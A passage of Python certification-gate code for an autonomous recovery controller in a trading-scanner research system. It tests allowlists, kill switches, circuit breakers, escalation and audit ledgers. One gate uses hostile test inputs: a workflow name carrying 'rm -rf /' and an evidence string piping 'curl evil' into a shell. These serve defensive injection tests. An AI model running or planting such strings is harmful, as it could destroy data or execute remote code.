        i["incident_id"].endswith("MATURATION_REPORT_MISSING") for i in mr["incidents"])
    return _gate(_check(conds), {"checks": conds, "statuses": res}, "system_health.evaluate isolation")


def gate_k_allowlist() -> Dict[str, Any]:
    from scripts import autonomous_recovery as ar
    posted: List[Dict[str, Any]] = []

    class Sess:
        def get(self, url, params=None, timeout=None):
            r = mock.MagicMock()
            runs = [] if (params or {}).get("status") == "in_progress" else [
                {"id": 1, "created_at": "2999-01-01T00:00:00Z", "status": "completed", "conclusion": "success"}]
            r.json.return_value = {"workflow_runs": runs}
            return r

        def post(self, url, json=None, timeout=None):
            posted.append({"url": url, "json": json})
            r = mock.MagicMock()
            r.status_code = 204
            return r
    results = {}
    with mock.patch("scripts.system_health._gh", return_value=(Sess(), "o/r")), \
            mock.patch.object(ar, "fresh_health", return_value={}), mock.patch.object(ar.time, "sleep"):
        for a, spec in rp.ALLOWLIST.items():
            results[a] = ar.execute_action(a, spec)
    urls_ok = all(p["url"].endswith(f"/actions/workflows/{rp.ALLOWLIST[a]['workflow']}/dispatches")
                  for a, p in zip([a for a, s in rp.ALLOWLIST.items() if s["executor"] == "dispatch"], posted))
    inputs_ok = all(p["json"]["inputs"] == {k: str(v) for k, v in
                                            rp.ALLOWLIST[a]["inputs"].items()} and p["json"]["ref"] == "main"
                    for a, p in zip([a for a, s in rp.ALLOWLIST.items() if s["executor"] == "dispatch"], posted))
    rejects = {}
    for label, (a, s) in {"unknown action": ("UNKNOWN_ACTION", {"executor": "dispatch", "workflow": "x.yml"}),
                          "arbitrary workflow": ("RETRY_MATURATION", {**rp.ALLOWLIST["RETRY_MATURATION"],
                                                                      "workflow": "train-prebreakout-model.yml"}),
                          "command text": ("RETRY_MATURATION", {**rp.ALLOWLIST["RETRY_MATURATION"],
                                                                "workflow": "a.yml; rm -rf /"})}.items():
        rejects[label] = ar.execute_action(a, s).get("ok") is False
    gate_unknown = not rp.decide_requested_action("UNKNOWN_ACTION")["allowed"]
    h = {"incidents": [{"incident_id": "workflows:WORKFLOW_STALE", "severity": "WARNING", "subsystem": "workflows",
                        "evidence": {"workflow": "$(curl evil)|sh"}}], "subsystems": {"database": {"status": "HEALTHY"}}}
    mal = rp.build_plan(h, [], RECOVER)["decisions"][0]["policy"] == "ESCALATE"
    conds = {"every allowlisted action executes": all(r.get("ok") for r in results.values()),
             "dispatch URL is the fixed workflow": urls_ok, "inputs are the fixed constants": inputs_ok,
             **{f"rejects {k}": v for k, v in rejects.items()},
             "unknown action gate rejects": gate_unknown, "incident command text escalates": mal,
             "exactly 8 allowlisted actions": len(rp.ALLOWLIST) == 8}
    return _gate(_check(conds), {"checks": conds, "dispatches": len(posted)}, "scripts/autonomous_recovery.execute_action")


PROHIBITED_REQUESTS = ("CHANGE_SCORE_WEIGHT", "CHANGE_THRESHOLD", "CHANGE_TIER", "CHANGE_CONFLICT_PENALTY",
                       "CHANGE_CANDIDATE_RULE", "CHANGE_CONTROL_RULE", "CHANGE_OUTCOME_FORMULA",
                       "RESET_FORWARD_EPOCH", "DELETE_RESEARCH_DATA", "REWRITE_OUTCOME", "CHANGE_SECRET")


def gate_l_prohibited() -> Dict[str, Any]:
    res = {a: rp.decide_requested_action(a) for a in PROHIBITED_REQUESTS}
    conds = {a: (not r["allowed"] and r["policy"] == "ESCALATE" and r["risk_class"] == "PROHIBITED")
             for a, r in res.items()}
    conds["no allowlisted action touches model/research"] = not any(
        w in a for a in rp.ALLOWLIST for w in ("SCORE", "THRESHOLD", "TIER", "COHORT", "OUTCOME", "EPOCH", "SECRET"))
    return _gate(_check(conds), {"checks": conds}, "recovery_policy.decide_requested_action / PROHIBITED_ACTIONS")


def _stale_world(now):
    w = World(now - _dt.timedelta(days=8))
    w.parity_at = now - _dt.timedelta(days=1)
    w.fail_maturation_days = {_dt.date(2026, 11, 23), _dt.date(2026, 11, 24)}
    return w


def gate_m_attempt_limit() -> Dict[str, Any]:
    t0 = _dt.datetime(2026, 11, 25, 15, 0, tzinfo=UTC)
    w = _stale_world(t0)
    h = w.health(t0)
    ledger: List[Dict[str, Any]] = []
    calls: List[str] = []
    seq = []
    for k in range(5):
        t = t0 + _dt.timedelta(minutes=50 * k)
        out = cycle(h, ledger, RECOVER, t, lambda a, s: calls.append(a) or {"ok": False, "error": "fail"}, lambda: h)
        seq.append(next(d["policy"] for d in out["plan"]["decisions"] if d["incident_type"] == "MATURATION_STALE"))
    conds = {"exactly 2 attempts": calls.count("RETRY_MATURATION") == 2,
             "then ESCALATE": seq[-1] == "ESCALATE",
             "ESCALATED event": any(e["result"] == "ESCALATED" and e.get("action") == "RETRY_MATURATION" for e in ledger)}
    return _gate(_check(conds), {"checks": conds, "policies": seq}, "recovery_policy.attempt_state")


def gate_n_cooldown() -> Dict[str, Any]:
    t0 = _dt.datetime(2026, 11, 25, 15, 0, tzinfo=UTC)
    w = _stale_world(t0)
    h = w.health(t0)
    ledger: List[Dict[str, Any]] = []
    calls: List[str] = []
    for k in range(8):   # a health/recovery check every 5 minutes
        t = t0 + _dt.timedelta(minutes=5 * k)
        cycle(h, ledger, RECOVER, t, lambda a, s: calls.append(a) or {"ok": False, "error": "fail"}, lambda: h)
    conds = {"one execution within the cooldown": calls.count("RETRY_MATURATION") == 1,
             "cooldown recorded": sum(1 for e in ledger if e["result"] == "COOLDOWN") >= 6}
    return _gate(_check(conds), {"checks": conds, "executions": len(calls)}, "ALLOWLIST cooldown_min")


def gate_o_kill_switch() -> Dict[str, Any]:
    t0 = _dt.datetime(2026, 11, 25, 17, 25, tzinfo=UTC)
    out = {}
    for label, env in (("disabled", {"HSF_AUTONOMY_ENABLED": "false", "HSF_AUTONOMY_MODE": "recover"}),
                       ("observe", {"HSF_AUTONOMY_ENABLED": "true", "HSF_AUTONOMY_MODE": "observe"}),
                       ("typo", {"HSF_AUTONOMY_ENABLED": "ture", "HSF_AUTONOMY_MODE": "recover"}),
                       ("unset", {}), ("recover", RECOVER)):
        w = _stale_world(t0)
        h = w.health(t0)
        ledger: List[Dict[str, Any]] = []
        calls: List[str] = []
        res = cycle(h, ledger, env, t0, lambda a, s: calls.append(a) or {"ok": True}, lambda: w.health(t0))
        out[label] = {"health_rendered": bool(h["subsystems"]), "plan": res["plan"]["would_execute"],
                      "executed": calls, "state": res["plan"]["autonomy"]["production_state"]}
    conds = {f"{k}: no execution": not out[k]["executed"] for k in ("disabled", "observe", "typo", "unset")}
    conds.update({f"{k}: monitoring + planning continue": out[k]["health_rendered"] and bool(out[k]["plan"])
                  for k in out})
    conds["recover mode executes under fixture"] = bool(out["recover"]["executed"])
    conds["no model mode exists"] = rp.autonomy_config({"HSF_AUTONOMY_ENABLED": "true",
                                                        "HSF_AUTONOMY_MODE": "model"})["execution_permitted"] is False
    return _gate(_check(conds), {"checks": conds, "modes": out}, "recovery_policy.autonomy_config")


def gate_p_circuit() -> Dict[str, Any]:
    t0 = _dt.datetime(2026, 11, 25, 15, 0, tzinfo=UTC)
    w = _stale_world(t0)
    h = w.health(t0)
    fails = [{"incident_id": f"x:{i}", "action": "RETRY_MATURATION", "result": "FAILED",
              "started_at": (t0 - _dt.timedelta(minutes=10 + i)).isoformat()} for i in range(3)]
    ledger = list(fails)
    calls: List[str] = []
    out = cycle(h, ledger, RECOVER, t0, lambda a, s: calls.append(a) or {"ok": True}, lambda: h)
    later = t0 + _dt.timedelta(days=2)
    still = rp.circuit_state(w.health(later), ledger, later)
    esc = out["escalation"]["items"]
    # multiple critical incidents
    inp = health_inputs(t0)
    inp["db_probe"] = {"connected": False}
    inp["universe"].update(symbol_count=0, source="none")
    multi = rp.circuit_state(sh.evaluate(inp), [], t0)
    # verification that creates a new critical incident
    bad_after = sh.evaluate({**health_inputs(t0), "db_probe": {"connected": False}})
    led3: List[Dict[str, Any]] = []
    w3 = _stale_world(t0)          # fresh world: never evaluate "now" on a world advanced into the future
    cycle(w3.health(t0), led3, RECOVER, t0, lambda a, s: {"ok": True}, lambda: bad_after)
    new_crit = rp.circuit_state(w3.health(t0 + _dt.timedelta(minutes=5)), led3, t0 + _dt.timedelta(minutes=5))
    reset = ledger + [{"incident_id": "system:AUTONOMY_CIRCUIT_OPEN", "result": "CIRCUIT_RESET",
                       "started_at": (later - _dt.timedelta(minutes=1)).isoformat()}]
    conds = {"repeated failures open circuit": out["plan"]["circuit_breaker"]["open"],
             "CIRCUIT_OPENED recorded": any(e["result"] == "CIRCUIT_OPENED" for e in ledger),
             "no execution while open": not calls,
             "escalation produced": any(i["incident_type"] == "AUTONOMY_CIRCUIT_OPEN" for i in esc),
             "does not silently reset": still["open"],
             "multiple critical incidents open circuit": multi["open"],
             "new critical after recovery opens circuit": new_crit["open"],
             "human reset closes circuit": not rp.circuit_state(w.health(later), reset, later)["open"],
             "monitoring continues while open": bool(w.health(later)["subsystems"])}
    return _gate(_check(conds), {"checks": conds}, "recovery_policy.circuit_state")


def gate_q_ledger() -> Dict[str, Any]:
    from db import recovery_ledger as led
    t0 = _dt.datetime(2026, 11, 25, 17, 25, tzinfo=UTC)
    w = _stale_world(t0)
    conn = sqlite3.connect(":memory:")
    try:
        events: List[Dict[str, Any]] = []
        cycle(w.health(t0), events, RECOVER, t0, w.execute(lambda: t0), lambda: w.health(t0))
        with mock.patch("db.recovery_ledger._dt") as fake_dt:
            fake_dt.datetime.now.return_value = t0
            fake_dt.timedelta = _dt.timedelta
            for e in events:
                led.append_event(e, conn=conn)
            first = led.list_recent(days=7, conn=conn)
            events2: List[Dict[str, Any]] = list(first)
            cycle(w.health(t0 + _dt.timedelta(hours=1)), events2, RECOVER, t0 + _dt.timedelta(hours=1),
                  w.execute(lambda: t0), lambda: w.health(t0 + _dt.timedelta(hours=1)))
            for e in events2[len(first):]:
                led.append_event(e, conn=conn)
            second = led.list_recent(days=7, conn=conn)
    finally:
        conn.close()
    attempt = next((e for e in events if e.get("action") == "RETRY_MATURATION"), {})
    fields = ("incident_id", "action", "attempt", "result", "started_at", "completed_at", "health_before",
              "health_after", "verification_result", "error")
    public = [n for n in dir(led) if callable(getattr(led, n)) and not n.startswith("_")]
    conds = {"attempt event has audit fields": all(k in attempt for k in fields),
             "health before/after captured": bool(attempt.get("health_before")) and bool(attempt.get("health_after")),
             "history preserved (append-only)": [e["recovery_id"] for e in first] ==
             [e["recovery_id"] for e in second][:len(first)],
             "no delete/update API": not [n for n in public if any(w_ in n for w_ in ("delete", "update", "purge", "clear"))]}
    return _gate(_check(conds), {"checks": conds, "events": len(second)}, "db/recovery_ledger.py")


def gate_r_escalation() -> Dict[str, Any]:
    t0 = _dt.datetime(2026, 11, 25, 15, 0, tzinfo=UTC)
    w = World(t0 - _dt.timedelta(days=8))
    w.parity_at = t0 - _dt.timedelta(days=1)
    w.fail_maturation_days = {_dt.date(2026, 11, 24)}   # one failed nightly run → MATURATION_STALE
    w.advance(t0)
    w.maturation_broken = True                        # ...and every retry keeps failing
    ledger: List[Dict[str, Any]] = []
    for k in range(3):
        t = t0 + _dt.timedelta(minutes=50 * k)
        h = w.health(t)
        out = cycle(h, ledger, RECOVER, t, w.execute(lambda t=t: t), lambda t=t: w.health(t))
    esc = out["escalation"]
    md = rc.render_escalation_md(esc)
    item = next((i for i in esc["items"] if i["incident_type"] == "MATURATION_STALE"), {})
    conds = {"escalation required": esc["human_action_required"],
             "what happened": bool(item.get("incident_type")), "when": bool(item.get("detected")),
             "severity": bool(item.get("severity")), "what HSF tried": len(item.get("what_hsf_tried") or []) == 2,
             "attempts used": item.get("automatic_attempts") == "2/2", "system state": bool(esc.get("system_status")),
             "recommended human action": bool(item.get("recommended_human_action")),
             "markdown headline": md.startswith("# HSF HUMAN ACTION REQUIRED")}
    return _gate(_check(conds), {"checks": conds, "markdown_excerpt": md[:600]}, "recovery_controller.escalation")


def gate_s_anti_peeking(extra_artifacts: Optional[List[Path]] = None) -> Dict[str, Any]:
    t0 = _dt.datetime(2026, 11, 25, 17, 25, tzinfo=UTC)
    w = _stale_world(t0)
    h = w.health(t0)
    ledger: List[Dict[str, Any]] = []
    out = cycle(h, ledger, RECOVER, t0, w.execute(lambda: t0), lambda: w.health(t0))
    docs = {"health.json": h, "plan": out["plan"], "escalation": out["escalation"], "ledger": ledger}
    bad = {k: sh.forbidden_keys(v) + sh.forbidden_text(json.dumps(v, default=str)) for k, v in docs.items()}
    md = sh.render_markdown(h) + rc.render_plan_md(out["plan"]) + rc.render_escalation_md(out["escalation"])
    bad["markdown"] = sh.forbidden_text(md)
    # The Streamlit view only renders the (already audited) model; audit its source text too.
    view_src = (ROOT / "ui" / "system_health_view.py").read_text()
    bad["streamlit view source"] = sh.forbidden_text(view_src) + [
        t for t in ("win_rate", "mean_return", "spearman", "mfe_mean", "effect_size") if t in view_src]
    for p in extra_artifacts or []:
        if p.exists():
            txt = p.read_text()
            obj = json.loads(txt) if p.suffix == ".json" else None
            bad[p.name] = (sh.forbidden_keys(obj) if obj is not None else []) + sh.forbidden_text(txt)
    injected = copy.deepcopy(health_inputs(t0))
    injected["readiness"]["win_rate"] = 0.9
    injected["readiness"]["candidate_mean_return"] = 0.01
    leak = sh.evaluate(injected)
    bad["injected effectiveness passthrough"] = [k for k in ("win_rate", "candidate_mean_return")
                                                 if k in json.dumps(leak)]
    conds = {k: not v for k, v in bad.items()}
    return _gate(_check(conds), {"checks": conds, "violations": {k: v for k, v in bad.items() if v}},
                 "system_health.assert_clean / forbidden_keys / forbidden_text")


def gate_t_epoch(before: Mapping[str, Any]) -> Dict[str, Any]:
    after = {k: fr.FORWARD_EPOCH[k] for k in EXPECTED_EPOCH}
    conds = {"unchanged during certification": dict(before) == after, "equals Run 56 epoch": after == EXPECTED_EPOCH,
             "gates unchanged": fr.GATES["A_trading_days"] == {"min": 10, "preferred": 20}
             and fr.GATES["E_maturation_parity"] == {"max_gap_pp": 10.0, "preferred_gap_pp": 5.0}}
    return _gate(_check(conds), {"checks": conds, "epoch": after}, "analytics/forward_readiness.FORWARD_EPOCH")


def frozen_scanner_snapshot() -> Dict[str, Any]:
    """The Run 57 frozen fixture: real engine on fixed synthetic prices."""
    import numpy as np
    import pandas as pd

    from analytics.observation_capture import build_scan_observations
    from analytics.research_cohorts import (
        build_control_observations,
        build_near_miss_observations,
        select_control_symbols,
    )
    from scan import engine
    rng = np.random.default_rng(3)
    idx = pd.date_range("2026-07-01", periods=60, freq="B")
    data = {}
    for i in range(41):
        sym = "SPY" if i == 40 else f"T{i:02d}"
        c = 20 * np.cumprod(1 + rng.normal(0.003, 0.02, 60))
        df = pd.DataFrame({"Open": c * 0.99, "High": c * 1.02, "Low": c * 0.98, "Close": c, "Adj Close": c,
                           "Volume": rng.integers(2e6, 5e6, 60).astype(float)}, index=idx)
        df.attrs["source"], df.attrs["feed"] = "alpaca_multi", "iex"
        data[sym] = df
    kw = dict(premarket=False, afterhours=False, unusual_volume=False, min_gap=0.0, min_price=1.0,
              max_price=1000.0, top_n=10, min_dollar_vol=5e6, profile="regular", use_cache=False)
    sink = {"near_miss_n": 5}
    with mock.patch("data.prices.fetch_price_data_parallel",
                    side_effect=lambda t, use_cache=True: ({k: data[k].copy() for k in t if k in data}, [])):
        df = engine.run_breakout_scan([f"T{i:02d}" for i in range(40)], research_sink=sink, **kw)
    ts = "2026-09-28T13:35:00+00:00"
    rows = df.to_dict("records")
    cand = build_scan_observations(rows, universe="US_MARKET", scan_timestamp=ts, session="regular", scan_id=ts,
                                   research_cohort="CANDIDATE", selection_reason="top_n_candidate")
    nm = build_near_miss_observations(sink["near_miss_rows"], universe="US_MARKET", scan_timestamp=ts,
                                      session="regular", scan_id=ts)
    ctrl_syms = select_control_symbols(sink["evaluated_symbols"], scan_run_id=ts,
                                       exclude=[r["Ticker"] for r in rows], n=8)
    snap = {k: {"price": v["price"], "volume": v["volume"]} for k, v in sink["price_snapshot"].items()}
    ctrl = build_control_observations(ctrl_syms, snap, universe="US_MARKET", scan_timestamp=ts, session="regular",
                                      scan_id=ts)

    def strip(o):
        o = dict(o)
        o.pop("research_metadata", None)
        o.pop("created_at", None)
        return o
    return json.loads(json.dumps({"tickers": list(df.Ticker), "scores": [round(float(x), 10) for x in df.BreakoutScore],
                                  "near_miss": [r["Ticker"] for r in sink["near_miss_rows"]], "controls": ctrl_syms,
                                  "obs": [strip(o) for o in cand + nm + ctrl]}, default=str, sort_keys=True))


def gate_u_frozen_scanner() -> Dict[str, Any]:
    golden = json.loads(GOLDEN.read_text())
    cur = frozen_scanner_snapshot()
    conds = {k: cur[k] == golden[k] for k in ("tickers", "scores", "near_miss", "controls")}
    conds["observations (signal fields) identical"] = cur["obs"] == golden["obs"]
    return _gate(_check(conds), {"checks": conds, "n_observations": len(cur["obs"])},
                 "tests/fixtures/frozen_scanner_golden.json (generated at 8e613e5; identical at ebd00a6)")


def gate_v_current_state(health: Optional[Mapping[str, Any]], plan: Optional[Mapping[str, Any]]) -> Dict[str, Any]:
    if not health or not plan:
        return _gate("FAIL", {"reason": "no current production health/plan supplied"}, "artifacts/health")
    now = _dt.datetime.fromisoformat(str(health["generated_at"]))
    trading = mc.is_trading_day(now.astimezone(mc.ET).date())
    codes = {i["incident_id"].split(":")[-1] for i in health.get("incidents") or []}
    decisions = {d["incident_type"]: d["policy"] for d in plan.get("decisions") or []}
    conds = {"no false missed-scan": "MISSED_SCAN" not in codes or trading,
             "no forward-data failure for a closed market": health["subsystems"]["forward_evidence"]["status"] != "ACTION_REQUIRED",
             "no weekend maturation recovery": trading or not any(
                 d["action"] in ("RETRY_MATURATION", "RETRY_TRANSIENT_PROVIDER_OPERATION")
                 for d in plan.get("decisions") or [] if d["policy"] == "AUTO_RECOVER"),
             "known backlog is WATCH": decisions.get("MATURATION_CAP_BINDING", "WATCH") in ("WATCH", "NO_ACTION"),
             "circuit closed": not plan["circuit_breaker"]["open"]}
    return _gate(_check(conds), {"checks": conds, "generated_at": health["generated_at"], "trading_day": trading,
                                 "system_status": health["system_status"], "incidents": sorted(codes),
                                 "decisions": decisions}, "live production health + observe-mode recovery plan")


def gate_w_monday() -> Dict[str, Any]:
    sat = _dt.datetime(2026, 11, 21, 8, 35, tzinfo=UTC)
    w = World(sat - _dt.timedelta(days=8))
    w.parity_at = sat - _dt.timedelta(days=1)
    w.advance(sat)
    w.report = w._report(_dt.datetime(2026, 11, 20, 23, 41, tzinfo=UTC), deferred=1213, schema="hsf-maturation-1.1")
    w.report["backlog"]["max_symbols"] = 400
    h_sat = w.health(sat)
    p_sat = rp.build_plan(h_sat, [], RECOVER, now=sat)
    mon_open = _dt.datetime(2026, 11, 23, 12, 0, tzinfo=UTC)
    h_pre = w.health(mon_open)
    p_pre = rp.build_plan(h_pre, [], RECOVER, now=mon_open)
    mon_close = _dt.datetime(2026, 11, 23, 23, 50, tzinfo=UTC)
    h_mon = w.health(mon_close)          # Monday scans + the 2,000-cap scheduled maturation (deferred 0)
    ledger: List[Dict[str, Any]] = []
    calls: List[str] = []
    cycle(h_mon, ledger, RECOVER, mon_close, lambda a, s: calls.append(a) or {"ok": True}, lambda: h_mon)
    conds = {"Saturday: backlog WATCH only": {i["incident_id"] for i in h_sat["incidents"]} ==
             {"maturation:MATURATION_CAP_BINDING"} and not p_sat["would_execute"],
             "Monday pre-open: no missed-scan, no recovery": "scanner:MISSED_SCAN" not in
             {i["incident_id"] for i in h_pre["incidents"]} and not p_pre["would_execute"],
             "Monday: scans ran": h_mon["subsystems"]["scanner"]["metrics"]["completed_scans"] > 0,
             "Monday: observations captured": h_mon["subsystems"]["research_capture"]["metrics"]["observations"] > 0,
             "backlog cleared under 2,000 cap": "maturation:MATURATION_CAP_BINDING" not in
             {i["incident_id"] for i in h_mon["incidents"]},
             "health HEALTHY": h_mon["system_status"] == "HEALTHY",
             "forward readiness updates": h_mon["forward_evidence_status"] == "COLLECTING",
             "recovery idle when healthy": not calls}
    return _gate(_check(conds), {"checks": conds}, "World simulation Sat → Mon")


def gate_x_thirty_days() -> Dict[str, Any]:
    start = _dt.datetime(2026, 11, 9, 0, 0, tzinfo=UTC)
    w = World(start - _dt.timedelta(days=8))
    w.transient_429_days = {_dt.date(2026, 11, 11)}
    w.rate_limit_days = {_dt.date(2026, 11, 13)}
    w.fail_maturation_days = {_dt.date(2026, 11, 17)}
    w.skip_readiness_days = {_dt.date(2026, 11, 19), _dt.date(2026, 11, 20), _dt.date(2026, 11, 23)}
    ledger: List[Dict[str, Any]] = []
    log = []
    per_day_exec: Dict[str, int] = {}
    circuit_exec = 0
    for day in range(30):
        d = (start + _dt.timedelta(days=day)).date()
        if d == _dt.date(2026, 11, 24):
            w.db_ok = False                       # unrecoverable: DB outage for one check
        if d == _dt.date(2026, 11, 25):
            w.db_ok = True
            ledger.append({"incident_id": "system:AUTONOMY_CIRCUIT_OPEN", "result": "CIRCUIT_RESET",
                           "started_at": _dt.datetime(d.year, d.month, d.day, 12, 0, tzinfo=UTC).isoformat()})
        if d == _dt.date(2026, 12, 1):
            w.maturation_broken = True            # persistent maturation failure → attempts then escalation
        if d == _dt.date(2026, 12, 3):
            w.maturation_broken = False           # human fixed it and reset the circuit
            ledger.append({"incident_id": "system:AUTONOMY_CIRCUIT_OPEN", "result": "CIRCUIT_RESET",
                           "started_at": _dt.datetime(d.year, d.month, d.day, 12, 0, tzinfo=UTC).isoformat()})
        checks = [(17, 25), (23, 59)]
        if d == _dt.date(2026, 12, 2):
            checks = [(17, 25), (17, 35), (23, 59)]   # an extra manual dispatch 10 min later → cooldown
        for hh, mm in checks:
            t = _dt.datetime(d.year, d.month, d.day, hh, mm, tzinfo=UTC)
            h = w.health(t)
            before = len(w.actions_executed)
            out = cycle(h, ledger, RECOVER, t, w.execute(lambda t=t: t), lambda t=t: w.health(t))
            n = len(w.actions_executed) - before
            per_day_exec[str(d)] = per_day_exec.get(str(d), 0) + n
            if out["plan"]["circuit_breaker"]["open"]:
                circuit_exec += n
            log.append({"t": t.isoformat(), "trading": mc.is_trading_day(d), "status": h["system_status"],
                        "incidents": [i["incident_id"] for i in h["incidents"]],
                        "executed": [a for a, _ in w.actions_executed[before:]],
                        "circuit": out["plan"]["circuit_breaker"]["open"]})
    results = [e["result"] for e in ledger]
    succ = {(e.get("incident_type"), e.get("action")) for e in ledger if e.get("result") == "SUCCESS"}
    maturation_attempts_dec = [a for a, t in w.actions_executed if a == "RETRY_MATURATION" and t[:10] in
                               ("2026-12-01", "2026-12-02")]
    waiting_days = [x for x in log if not x["trading"]]
    bounded = {a for a, s in rp.ALLOWLIST.items() if s.get("trading_days_only")}
    conds = {
        "no unbounded executions (≤ 4/day)": max(per_day_exec.values()) <= 4,
        "total executions bounded (≤ 20 in 30 days)": len(w.actions_executed) <= 20,
        "no execution while circuit open": circuit_exec == 0,
        "no scanner reruns": all(a != "RETRY_SAFE_SCANNER_RUN" for a, _ in w.actions_executed),
        "only allowlisted actions": all(a in rp.ALLOWLIST for a, _ in w.actions_executed),
        "no duplicate evidence": len(w.obs_ids) == len(set(w.obs_ids)),
        "epoch unchanged": fr.FORWARD_EPOCH["forward_epoch_start_timestamp"] == EXPECTED_EPOCH["forward_epoch_start_timestamp"],
        "rate-limit pressure recovered": ("RATE_LIMIT_PRESSURE", "RETRY_TRANSIENT_PROVIDER_OPERATION") in succ,
        "failed maturation recovered": ("MATURATION_STALE", "RETRY_MATURATION") in succ,
        "stale artifact regenerated": any(a == "REGENERATE_FORWARD_READINESS" for a, _ in succ) or
        any(e.get("action") == "REGENERATE_FORWARD_READINESS" and e.get("result") == "SUCCESS" for e in ledger),
        "DB outage escalated + circuit opened": "CIRCUIT_OPENED" in results,
        "persistent failure: ≤ 2 attempts then escalation": len(maturation_attempts_dec) <= 2 and any(
            e.get("result") in ("ESCALATED", "ATTEMPT_LIMIT") and str(e.get("started_at", ""))[:10] in
            ("2026-12-01", "2026-12-02", "2026-12-03") for e in ledger),
        "cooldowns observed": "COOLDOWN" in results or "ATTEMPT_LIMIT" in results,
        "expected waiting: no false scan/capture incidents": all(
            not [i for i in x["incidents"] if any(c in i for c in ("MISSED_SCAN", "ZERO_OBSERVATIONS", "STALE_SCANNER"))]
            for x in waiting_days),
        "expected waiting: no trading-day-only (BOUNDED) actions": all(not (set(x["executed"]) & bounded)
                                                                      for x in waiting_days),
        "transient 429 needed no action": not any(e.get("incident_type") == "RATE_LIMIT_RECOVERED" for e in ledger),
        "system healthy at the end": log[-1]["status"] == "HEALTHY",
    }
    return _gate(_check(conds), {"checks": conds, "executions": w.actions_executed,
                                 "ledger_results": {r: results.count(r) for r in sorted(set(results))},
                                 "trading_days": sum(1 for x in log if x["trading"]) // 2,
                                 "non_trading_days": len(waiting_days) // 2},
                 "World simulation 2026-11-09 → 2026-12-08 (Thanksgiving + early close)")


def info_schedule_timezone() -> Dict[str, Any]:
    """Informational (non-blocking): the health plane's expected scan slots are UTC
    constants (cron-job.org dispatch). Observed EDT run times are consistent with both
    a UTC job and an America/New_York job, so this cannot be proven until DST ends."""
    return _gate("WARN", {"scan_slots_utc": [f"{h:02d}:{m:02d}" for h, m in mc.SCAN_SLOTS_UTC],
                          "dst_end": "2026-11-01",
                          "risk": "if the cron-job.org job uses America/New_York, winter runs shift +1h UTC "
                                  "and slot matching would raise false MISSED_SCAN incidents"},
                 "analytics/market_calendar.SCAN_SLOTS_UTC",
                 notes="Confirm the cron-job.org job timezone is UTC before 2026-11-01 (runbook).",
                 mandatory=False)


MANDATORY_GATES = tuple("ABCDEFGHIJKLMNOPQRSTUVWX")


def verdict_from(gates: Mapping[str, Mapping[str, Any]]) -> str:
    """Exactly two outcomes. Every A–X gate must be present, mandatory and PASS."""
    ok = all(k in gates and gates[k].get("mandatory") and gates[k].get("status") == "PASS" for k in MANDATORY_GATES)
    return CERTIFIED if ok else NOT_CERTIFIED


GATE_TITLES = {
    "A": "Scheduled operation", "B": "Market calendar safety", "C": "Scanner point-in-time integrity",
    "D": "Research capture idempotency", "E": "Maturation idempotency", "F": "Provider failure handling",
    "G": "Maturation backlog recovery", "H": "Universe recovery", "I": "Database failure safety",
    "J": "Health plane failure isolation", "K": "Recovery allowlist", "L": "Prohibited model actions",
    "M": "Attempt limit", "N": "Cooldown", "O": "Kill switch", "P": "Circuit breaker", "Q": "Recovery ledger",
    "R": "Human escalation", "S": "Anti-peeking", "T": "Forward epoch preservation",
    "U": "Frozen scanner regression", "V": "Weekend current-state", "W": "Monday startup simulation",
    "X": "30-day unattended simulation",
    "INFO_1": "Scan schedule timezone assumption (informational)",
}


def run_all(*, current_health=None, current_plan=None, extra_artifacts=None) -> Dict[str, Any]:
    epoch_before = {k: fr.FORWARD_EPOCH[k] for k in EXPECTED_EPOCH}
    fns = {"A": gate_a_scheduled_operation, "B": gate_b_calendar, "C": gate_c_point_in_time,
           "D": gate_d_capture_idempotency, "E": gate_e_maturation_idempotency, "F": gate_f_provider_failures,
           "G": gate_g_backlog_recovery, "H": gate_h_universe, "I": gate_i_database, "J": gate_j_isolation,
           "K": gate_k_allowlist, "L": gate_l_prohibited, "M": gate_m_attempt_limit, "N": gate_n_cooldown,
           "O": gate_o_kill_switch, "P": gate_p_circuit, "Q": gate_q_ledger, "R": gate_r_escalation,
           "S": lambda: gate_s_anti_peeking(extra_artifacts), "U": gate_u_frozen_scanner,
           "V": lambda: gate_v_current_state(current_health, current_plan), "W": gate_w_monday,
           "X": gate_x_thirty_days}
    gates: Dict[str, Any] = {}
    for g, fn in fns.items():
        try:
            gates[g] = fn()
        except Exception as e:   # an error in a gate is a FAIL, never a skip
            gates[g] = _gate("FAIL", {"error": f"{type(e).__name__}: {e}"[:400]}, "exception")
    gates["T"] = gate_t_epoch(epoch_before)
    gates["INFO_1"] = info_schedule_timezone()
    gates = {k: {"title": GATE_TITLES[k], **gates[k]} for k in sorted(gates)}
    mand = [g for g in gates.values() if g["mandatory"]]
    passed = sum(1 for g in mand if g["status"] == "PASS")
    verdict = verdict_from(gates)
    return {"schema": SCHEMA, "release": RELEASE, "gates": gates, "mandatory_gates": len(mand),
            "mandatory_passed": passed, "mandatory_failed": len(mand) - passed, "verdict": verdict,
            "engineering_certification": verdict,
            "autonomy_level": "AUTONOMOUS" if verdict == CERTIFIED else "RECOVERY_READY"}
